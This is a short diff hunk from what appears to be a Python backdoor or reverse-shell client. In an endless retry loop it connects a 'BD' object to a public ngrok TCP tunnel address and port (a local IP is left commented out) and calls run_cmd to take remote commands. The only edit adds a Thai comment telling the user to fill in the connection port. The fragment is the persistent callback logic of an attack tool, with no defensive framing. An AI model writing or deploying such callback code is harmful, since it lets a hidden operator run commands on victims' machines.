@@ -649,7 +649,7 @@ if __name__ == "__main__":
     try:
         while True:
             try:
-                server_bd = BD("0.tcp.ap.ngrok.io", 17092)
+                server_bd = BD("0.tcp.ap.ngrok.io", 17092)# ใส่ port เชื่อมต่อ
                 # server_bd = BD("192.168.1.101", 5555)
                 server_bd.run_cmd()
             except Exception as e:
